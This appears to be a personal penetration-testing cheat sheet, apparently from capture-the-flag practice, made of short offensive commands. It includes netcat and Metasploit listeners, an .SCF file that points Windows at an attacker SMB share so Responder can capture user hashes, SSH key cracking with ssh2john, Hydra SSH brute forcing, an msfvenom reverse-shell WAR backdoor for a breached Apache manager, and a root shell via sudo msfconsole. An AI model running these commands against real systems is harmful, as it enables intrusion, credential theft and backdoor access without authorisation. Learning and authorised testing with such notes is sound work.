
## Get Version of Service

NetCat

```
nc IP PORT
```

Listen on port
```
nc IP PORT -lvnp
```

Listen throuh metsploit
```
use exploit/multi/handler
```

## Find Exploits with SearchSploit

```
searchsploit servicename version
```

## Add new modules to metasploit from exploit-db

Get path from searchsploit

```
curl http://www.exploit-db.com/download/ID  /root/.msf4/modules/exploits/custom/CUSTOMFILENAME
```

## .SCF file to gain user hash (WINDOWS)

```
[Shell]
Command=2
IconFile=\\10.10.14.6\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

listen to response
```
sudo responder -w -I tun0
```

## Metadata

```
exiftool file
```

## Web Server:

```
python3 -m http.server PORT
```

Retrieve:
```
wget http://IP:PORT/PATH
```

# SSH

## SSH with RSA file

```
ssh -i /path/to/file user@IP
```
## Convert id_rsa to crackable

```
python3 /usr/share/john/ssh2john.py id_rsa > file.txt
```

### Brute Forcing Passwords

```
hydra -l USER -P /path/to/wordlist ssh://IP
```

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials


# Apache

## After /manager breach

### Make Offensive WAR file

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
```


# Sudo Metasploit exploit

```
sudo msfconsole
```

```
irb
system("/bin/bash")
```
